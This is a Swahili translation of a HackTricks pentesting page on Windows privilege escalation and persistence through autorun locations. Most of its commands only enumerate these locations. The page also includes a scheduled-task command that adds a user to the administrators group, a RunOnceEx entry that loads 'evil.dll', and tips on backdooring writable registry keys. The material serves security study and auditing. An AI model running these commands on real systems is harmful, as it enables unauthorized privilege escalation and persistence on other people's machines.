# Kuongeza Mamlaka kwa Kutumia Autoruns

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ikiwa una nia ya **kazi ya kudukua** na kudukua vitu visivyodukuliwa - **tunakupa ajira!** (_inahitajika uwezo wa kuandika na kuzungumza Kipolishi kwa ufasaha_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** inaweza kutumika kuendesha programu wakati wa **kuanza**. Angalia ni programu zipi zimepangwa kuanza wakati wa kuanza na:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Kazi Zilizopangwa

**Kazi** zinaweza kupangwa kufanya kazi kwa **frekwensi fulani**. Angalia ni faili zipi zilizopangwa kufanya kazi kwa kutumia:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Vichupo

Vichupo vyote vilivyoko kwenye **vichupo vya kuanza vitatekelezwa wakati wa kuanza**. Vichupo vya kuanza vya kawaida ni vile vilivyoorodheshwa hapa chini, lakini kichupo cha kuanza kinaonyeshwa kwenye usajili. [Soma hii ili kujua mahali.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Usajili

{% hint style="info" %}
[Note kutoka hapa](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Kuingia kwa usajili wa **Wow6432Node** inaonyesha kuwa unatumia toleo la Windows la 64-bit. Mfumo wa uendeshaji hutumia ufunguo huu kuonyesha mtazamo tofauti wa HKEY\_LOCAL\_MACHINE\SOFTWARE kwa programu za 32-bit ambazo zinaendeshwa kwenye toleo la Windows la 64-bit.
{% endhint %}

### Inaendeshwa

Usajili wa AutoRun maarufu:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Vidokezo vya usajili vinavyojulikana kama **Run** na **RunOnce** vimeundwa ili kutekeleza programu kiotomatiki kila wakati mtumiaji anapoingia kwenye mfumo. Mstari wa amri uliopewa kama thamani ya data ya ufunguo unazuiliwa hadi wahusika 260 au chini.

**Inaendeshwa kwa Huduma** (inaweza kudhibiti kuanza kiotomatiki kwa huduma wakati wa kuanza):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Kwenye Windows Vista na toleo zingine baadaye, ufunguo wa usajili wa **Run** na **RunOnce** haizalishwi kiotomatiki. Vitu katika ufunguo huu vinaweza kuanza programu moja kwa moja au kuzitaja kama tegemezi. Kwa mfano, ili kupakia faili ya DLL wakati wa kuingia, mtu anaweza kutumia ufunguo wa usajili wa **RunOnceEx** pamoja na ufunguo wa "Depend". Hii inadhihirishwa kwa kuongeza kuingia kwenye usajili ili kutekeleza "C:\\temp\\evil.dll" wakati wa kuanza kwa mfumo:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: Ikiwa unaweza kuandika ndani ya usajili wowote ulioorodheshwa ndani ya **HKLM**, unaweza kuongeza mamlaka wakati mtumiaji tofauti anapoingia.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: Ikiwa unaweza kubadilisha faili yoyote iliyoorodheshwa kwenye usajili wowote ndani ya **HKLM**, unaweza kubadilisha faili hiyo na mlango wa nyuma wakati mtumiaji tofauti anapoingia na kuongeza mamlaka.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Njia ya Kuanza

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Vidokezo vilivyowekwa katika folda ya **Kuanza** zitazindua huduma au programu moja kwa moja wakati mtumiaji anapoingia au mfumo unapoanza tena. Mahali pa folda ya **Kuanza** imefafanuliwa katika usajili kwa ajili ya **Mashine ya Lokali** na **Mtumiaji wa Sasa**. Hii inamaanisha kuwa vidokezo vyovyote vilivyowekwa katika maeneo maalum ya **Kuanza** yatahakikisha huduma au programu inayoendelea inaanza baada ya mchakato wa kuingia au kuanza upya, hivyo kuwa njia rahisi ya kupanga programu zifanye kazi kiotomatiki.

{% hint style="info" %}
Ikiwa unaweza kubadilisha faili yoyote ya \[User] Shell Folder chini ya **HKLM**, utaweza kuielekeza kwenye folda inayodhibitiwa na wewe na kuweka mlango nyuma ambao utatekelezwa wakati wowote mtumiaji anapoingia kwenye mfumo na kuinua mamlaka.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Funguo za Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Kawaida, funguo la **Userinit** limewekwa kama **userinit.exe**. Hata hivyo, ikiwa funguo hili litabadilishwa, programu inayotajwa itazinduliwa na **Winlogon** wakati mtumiaji anapoingia. Vivyo hivyo, funguo la **Shell** linakusudiwa kuonyesha **explorer.exe**, ambayo ni kiolesura cha msingi cha Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Ikiwa unaweza kubadilisha thamani ya usajili au faili ya binary, utaweza kuongeza mamlaka.
{% endhint %}

### Mipangilio ya Sera

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Angalia ufunguo wa **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Kubadilisha Amri ya Safe Mode

Katika Usajili wa Windows chini ya `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, kuna thamani ya **`AlternateShell`** iliyowekwa kwa chaguo-msingi kuwa `cmd.exe`. Hii inamaanisha wakati unachagua "Safe Mode with Command Prompt" wakati wa kuanza (kwa kubonyeza F8), `cmd.exe` hutumiwa. Lakini, ni rahisi kuweka kompyuta yako kuanza moja kwa moja katika hali hii bila kuhitaji kubonyeza F8 na kuchagua kwa mkono.

Hatua za kuunda chaguo la kuanza moja kwa moja katika "Safe Mode with Command Prompt":

1. Badilisha sifa za faili ya `boot.ini` ili kuondoa alama za kusoma tu, mfumo, na siri: `attrib c:\boot.ini -r -s -h`
2. Fungua `boot.ini` kwa kuhariri.
3. Ingiza mstari kama huu: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Hifadhi mabadiliko kwenye `boot.ini`.
5. Rudisha sifa za awali za faili: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Kubadilisha ufunguo wa Usajili wa **AlternateShell** inaruhusu kuweka amri ya kawaida ya kuingia, iwezekanavyo kwa ufikiaji usioruhusiwa.
- **Exploit 2 (Ruhusa za Kuandika PATH):** Kuwa na ruhusa za kuandika sehemu yoyote ya mazingira ya mfumo ya **PATH**, hasa kabla ya `C:\Windows\system32`, inakuruhusu kutekeleza `cmd.exe` ya kawaida, ambayo inaweza kuwa mlango wa nyuma ikiwa mfumo unaanza katika Safe Mode.
- **Exploit 3 (Ruhusa za Kuandika PATH na boot.ini):** Ruhusa ya kuandika kwenye `boot.ini` inawezesha kuanza moja kwa moja katika Safe Mode, ikirahisisha ufikiaji usioruhusiwa baada ya kuanza upya.

Ili kuchunguza mipangilio ya sasa ya **AlternateShell**, tumia amri hizi:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Kipengele kilichosanikishwa

Active Setup ni kipengele katika Windows ambacho **kinazinduliwa kabla ya mazingira ya desktop hayajakamilika**. Inapewa kipaumbele katika utekelezaji wa amri fulani, ambazo lazima zikamilike kabla ya mchakato wa kuingia kwa mtumiaji kuendelea. Mchakato huu unatokea hata kabla ya vitu vingine vya kuanza, kama vile vile katika sehemu za usajili za Run au RunOnce, kuanza.

Active Setup inasimamiwa kupitia funguo za usajili zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Ndani ya funguo hizi, kuna funguo mbalimbali, kila moja ikilingana na kipengele maalum. Thamani za funguo muhimu ni pamoja na:

- **IsInstalled:**
- `0` inaonyesha kuwa amri ya kipengele haitatekelezwa.
- `1` inamaanisha kuwa amri itatekelezwa mara moja kwa kila mtumiaji, ambayo ni tabia ya msingi ikiwa thamani ya `IsInstalled` haipo.
- **StubPath:** Inafafanua amri itakayotekelezwa na Active Setup. Inaweza kuwa amri yoyote sahihi ya mstari wa amri, kama vile kuzindua `notepad`.

**Machapisho ya Usalama:**

- Kubadilisha au kuandika kwenye funguo ambapo **`IsInstalled`** imewekwa kama `"1"` na **`StubPath`** maalum kunaweza kusababisha utekelezaji usiohalali wa amri, kwa uwezekano wa kuongeza mamlaka.
- Kurekebisha faili ya binary iliyotajwa katika thamani yoyote ya **`StubPath`** pia inaweza kufanikisha kuongeza mamlaka, kwa kuzingatia ruhusa za kutosha.

Kutathmini mazingira ya **`StubPath`** kwenye vipengele vya Active Setup, amri hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Vitu vya Kusaidia Kivinjari

### Maelezo ya Vitu vya Kusaidia Kivinjari (BHOs)

Vitu vya Kusaidia Kivinjari (BHOs) ni moduli za DLL ambazo huongeza huduma za ziada kwa Internet Explorer ya Microsoft. Hizi hulipwa ndani ya Internet Explorer na Windows Explorer kila kuanza. Walakini, utekelezaji wao unaweza kuzuiwa kwa kuweka ufunguo wa **NoExplorer** kuwa 1, kuwazuia kupakia na mifano ya Windows Explorer.

BHOs ni sambamba na Windows 10 kupitia Internet Explorer 11 lakini hazisaidiwi katika Microsoft Edge, kivinjari cha chaguo-msingi katika toleo jipya la Windows.

Ili kuchunguza BHOs zilizosajiliwa kwenye mfumo, unaweza kuangalia funguo za usajili zifuatazo:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Kila BHO inawakilishwa na **CLSID** yake kwenye usajili, ikifanya kama kitambulisho cha kipekee. Maelezo ya kina kuhusu kila CLSID yanaweza kupatikana chini ya `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Kwa kuuliza BHOs kwenye usajili, amri hizi zinaweza kutumika:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Vipengele vya Internet Explorer

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Tambua kuwa usajili utaonyesha usajili mpya kwa kila dll na utawakilishwa na **CLSID**. Unaweza kupata habari ya CLSID katika `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Madereva ya Fonti

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Amri ya Kufungua

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Chaguo la Utekelezaji wa Faili ya Picha

Chaguo la Utekelezaji wa Faili ya Picha ni kipengele cha Windows kinachoruhusu mtumiaji kuweka programu ya ziada ya kutekeleza wakati faili ya picha inatekelezwa. Hii inaweza kutumiwa kwa faida ya kudhibiti mchakato wa utekelezaji wa faili ya picha na kufanya upelelezi wa kuboresha.

Kwa kufanya mabadiliko katika Usajili wa Windows, mtumiaji anaweza kuweka njia ya kutekelezwa kwa faili ya picha fulani. Wakati faili hiyo inatekelezwa, programu iliyowekwa itaanza kwanza kabla ya utekelezaji wa faili ya picha. Hii inaweza kutumiwa kwa madhumuni mbalimbali, ikiwa ni pamoja na kuongeza mamlaka ya mtumiaji na kufanya upelelezi wa kuboresha.

Kwa mfano, mtumiaji anaweza kuweka njia ya kutekelezwa kwa faili ya picha ya "cmd.exe". Wakati faili hiyo inatekelezwa, programu iliyowekwa itaanza kwanza kabla ya "cmd.exe" kuanza. Hii inaweza kutoa fursa ya kudhibiti mchakato wa utekelezaji wa "cmd.exe" na kufanya upelelezi wa kuboresha.

Kwa kuwa Chaguo la Utekelezaji wa Faili ya Picha linaweza kutumiwa kwa madhumuni mabaya, ni muhimu kuchukua hatua za kuhakikisha usalama wa mfumo. Hii inaweza kujumuisha kuzuia upatikanaji wa Usajili wa Windows, kusasisha programu za usalama, na kufuatilia shughuli za kawaida za mfumo ili kugundua shughuli zisizo za kawaida.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Tafadhali kumbuka kuwa tovuti zote ambapo unaweza kupata autoruns tayari zimeshatafutwa na [winpeas.exe](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Hata hivyo, kwa orodha kamili zaidi ya faili zinazoendeshwa moja kwa moja, unaweza kutumia [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) kutoka kwa SysInternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Zaidi

**Pata Autoruns zaidi kama registries katika [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**

## Marejeo

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Ikiwa una nia ya **kazi ya kuhack** na kuhack mambo yasiyohack - **tunakupa ajira!** (_inahitajika kuwa na uwezo wa kuandika na kuzungumza Kipolishi kwa ufasaha_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Jifunze kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa katika HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
